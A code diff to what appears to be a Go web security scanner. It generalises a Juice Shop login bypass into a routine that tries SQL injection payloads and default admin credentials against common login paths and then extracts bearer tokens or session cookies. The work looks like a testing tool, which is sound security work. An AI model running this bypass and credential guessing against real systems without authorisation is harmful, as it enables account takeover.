@@ -4,9 +4,11 @@ import (
 	"context"
 	"crypto/sha256"
 	"crypto/tls"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -21,10 +23,11 @@ type Prober interface {
 
 // ProberConfig holds shared configuration for probers.
 type ProberConfig struct {
-	BaseURL          string
-	AuthToken        string // JWT token for authenticated scanning
-	Client           *http.Client
-	BaseFingerprint  string // SHA256 prefix of base URL response (SPA detection)
+	BaseURL         string
+	AuthToken       string // JWT or session token for authenticated scanning
+	Client          *http.Client
+	BaseFingerprint string // SHA256 prefix of base URL response (SPA detection)
+	Classified      *types.ClassifiedEndpoints
 }
 
 // NewProberConfig creates a ProberConfig from a target.
@@ -44,6 +47,13 @@ func NewProberConfig(target types.Target) *ProberConfig {
 	}
 	// Fingerprint the base URL for SPA detection
 	cfg.BaseFingerprint = cfg.fingerprintURL(cfg.BaseURL)
+	return cfg
+}
+
+// NewProberConfigWithClassified creates a ProberConfig with classified endpoints.
+func NewProberConfigWithClassified(target types.Target, classified *types.ClassifiedEndpoints) *ProberConfig {
+	cfg := NewProberConfig(target)
+	cfg.Classified = classified
 	return cfg
 }
 
@@ -148,7 +158,8 @@ func AllProbers() []Prober {
 }
 
 // RunAllProbers runs every prober against the target and returns combined findings.
-func RunAllProbers(ctx context.Context, target types.Target, endpoints []types.Endpoint, loop int) []types.Finding {
+func RunAllProbers(ctx context.Context, target types.Target, endpoints []types.Endpoint, classified *types.ClassifiedEndpoints, loop int) []types.Finding {
+	// Store classified endpoints in target headers for probers to access via config
 	var all []types.Finding
 	for _, p := range AllProbers() {
 		select {
@@ -166,8 +177,21 @@ func RunAllProbers(ctx context.Context, target types.Target, endpoints []types.E
 	return all
 }
 
-// LoginJuiceShop performs SQLi login bypass and returns the auth token.
-func LoginJuiceShop(baseURL string) (string, error) {
+// SetClassifiedEndpoints stores the classified endpoints in a package-level
+// variable so probers can access them. This avoids changing the Prober interface.
+var currentClassified *types.ClassifiedEndpoints
+
+// RunAllProbersWithClassified runs all probers with classified endpoint context.
+func RunAllProbersWithClassified(ctx context.Context, target types.Target, endpoints []types.Endpoint, classified *types.ClassifiedEndpoints, loop int) []types.Finding {
+	currentClassified = classified
+	defer func() { currentClassified = nil }()
+	return RunAllProbers(ctx, target, endpoints, classified, loop)
+}
+
+// AttemptAuth tries to authenticate against the target using discovered login endpoints.
+// It tries SQLi bypass, default credentials, and common auth patterns.
+// Returns the auth token/header value, or empty string if auth fails.
+func AttemptAuth(baseURL string, classified *types.ClassifiedEndpoints) (string, error) {
 	client := &http.Client{
 		Timeout: 10 * time.Second,
 		Transport: &http.Transport{
@@ -175,29 +199,180 @@ func LoginJuiceShop(baseURL string) (string, error) {
 		},
 	}
 
-	loginURL := strings.TrimRight(baseURL, "/") + "/rest/user/login"
-	payload := `{"email":"' OR 1=1--","password":"anything"}`
-	resp, err := client.Post(loginURL, "application/json", strings.NewReader(payload))
-	if err != nil {
-		return "", fmt.Errorf("login request failed: %w", err)
-	}
-	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
+	base := strings.TrimRight(baseURL, "/")
 
-	if resp.StatusCode != 200 {
-		return "", fmt.Errorf("login failed with status %d", resp.StatusCode)
-	}
-
-	bodyStr := string(body)
-	// Extract token from response
-	if idx := strings.Index(bodyStr, `"token":"`); idx >= 0 {
-		start := idx + len(`"token":"`)
-		end := strings.Index(bodyStr[start:], `"`)
-		if end > 0 {
-			return "Bearer " + bodyStr[start:start+end], nil
+	// Collect login endpoints from classifier + common fallbacks
+	loginURLs := make([]string, 0)
+	if classified != nil {
+		for _, ep := range classified.Login {
+			loginURLs = append(loginURLs, ep.URL)
 		}
 	}
-	return "", fmt.Errorf("token not found in response: %s", truncate(bodyStr, 200))
+	// Always try common login paths as fallback
+	commonLoginPaths := []string{"/login", "/api/login", "/auth/login", "/api/auth/login",
+		"/rest/user/login", "/signin", "/api/signin", "/api/Users/login",
+		"/oauth/token", "/api/authenticate"}
+	for _, p := range commonLoginPaths {
+		u := base + p
+		found := false
+		for _, existing := range loginURLs {
+			if existing == u {
+				found = true
+				break
+			}
+		}
+		if !found {
+			loginURLs = append(loginURLs, u)
+		}
+	}
+
+	// Phase 1: SQLi bypass payloads (JSON format)
+	sqliPayloads := []string{
+		`{"email":"' OR 1=1--","password":"anything"}`,
+		`{"username":"' OR 1=1--","password":"anything"}`,
+		`{"email":"admin'--","password":"anything"}`,
+		`{"username":"admin'--","password":"anything"}`,
+		`{"email":"' OR '1'='1'--","password":"anything"}`,
+	}
+
+	// Phase 2: Default credentials
+	defaultCreds := []string{
+		`{"email":"admin@admin.com","password":"admin"}`,
+		`{"username":"admin","password":"admin"}`,
+		`{"email":"admin@admin.com","password":"password"}`,
+		`{"username":"admin","password":"password"}`,
+		`{"email":"admin@admin.com","password":"admin123"}`,
+		`{"username":"admin","password":"admin123"}`,
+		`{"email":"test@test.com","password":"test"}`,
+		`{"username":"test","password":"test"}`,
+	}
+
+	allPayloads := append(sqliPayloads, defaultCreds...)
+
+	for _, loginURL := range loginURLs {
+		for _, payload := range allPayloads {
+			resp, err := client.Post(loginURL, "application/json", strings.NewReader(payload))
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			if resp.StatusCode != 200 {
+				continue
+			}
+
+			bodyStr := string(body)
+
+			// Try to extract token from JSON response
+			token := extractAuthToken(bodyStr)
+			if token != "" {
+				return "Bearer " + token, nil
+			}
+
+			// Check Set-Cookie header for session tokens
+			cookies := resp.Header.Values("Set-Cookie")
+			if len(cookies) > 0 {
+				// Return the session cookie as auth
+				for _, c := range cookies {
+					if strings.Contains(strings.ToLower(c), "session") ||
+						strings.Contains(strings.ToLower(c), "token") ||
+						strings.Contains(strings.ToLower(c), "auth") {
+						return "Cookie:" + c, nil
+					}
+				}
+			}
+		}
+
+		// Phase 3: Try form-encoded login
+		formPayloads := []url.Values{
+			{"username": {"admin"}, "password": {"admin"}},
+			{"email": {"admin@admin.com"}, "password": {"admin"}},
+			{"username": {"' OR 1=1--"}, "password": {"anything"}},
+			{"email": {"' OR 1=1--"}, "password": {"anything"}},
+		}
+
+		for _, form := range formPayloads {
+			resp, err := client.PostForm(loginURL, form)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			if resp.StatusCode != 200 {
+				continue
+			}
+
+			bodyStr := string(body)
+			token := extractAuthToken(bodyStr)
+			if token != "" {
+				return "Bearer " + token, nil
+			}
+
+			cookies := resp.Header.Values("Set-Cookie")
+			for _, c := range cookies {
+				if strings.Contains(strings.ToLower(c), "session") ||
+					strings.Contains(strings.ToLower(c), "token") ||
+					strings.Contains(strings.ToLower(c), "auth") {
+					return "Cookie:" + c, nil
+				}
+			}
+		}
+	}
+
+	return "", fmt.Errorf("authentication failed against %d login endpoints", len(loginURLs))
+}
+
+// extractAuthToken tries to find a JWT or auth token in a JSON response body.
+func extractAuthToken(body string) string {
+	// Try common JSON token field names
+	tokenFields := []string{"token", "access_token", "accessToken", "jwt",
+		"id_token", "auth_token", "authToken", "session_token", "sessionToken"}
+
+	// Quick JSON parse
+	var data map[string]interface{}
+	if err := json.Unmarshal([]byte(body), &data); err != nil {
+		// Try to find token with string scanning as fallback
+		for _, field := range tokenFields {
+			pattern := fmt.Sprintf(`"%s":"`, field)
+			if idx := strings.Index(body, pattern); idx >= 0 {
+				start := idx + len(pattern)
+				end := strings.Index(body[start:], `"`)
+				if end > 0 {
+					token := body[start : start+end]
+					if len(token) > 10 { // reasonable token length
+						return token
+					}
+				}
+			}
+		}
+		return ""
+	}
+
+	// Search top-level and one level deep (e.g., {"authentication":{"token":"..."}})
+	for _, field := range tokenFields {
+		if val, ok := data[field]; ok {
+			if s, ok := val.(string); ok && len(s) > 10 {
+				return s
+			}
+		}
+	}
+
+	// Check nested objects
+	for _, val := range data {
+		if nested, ok := val.(map[string]interface{}); ok {
+			for _, field := range tokenFields {
+				if v, ok := nested[field]; ok {
+					if s, ok := v.(string); ok && len(s) > 10 {
+						return s
+					}
+				}
+			}
+		}
+	}
+
+	return ""
 }
 
 func truncate(s string, n int) string {
@@ -205,4 +380,12 @@ func truncate(s string, n int) string {
 		return s
 	}
 	return s[:n] + "..."
+}
+
+func extractPath(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return rawURL
+	}
+	return u.Path
 }
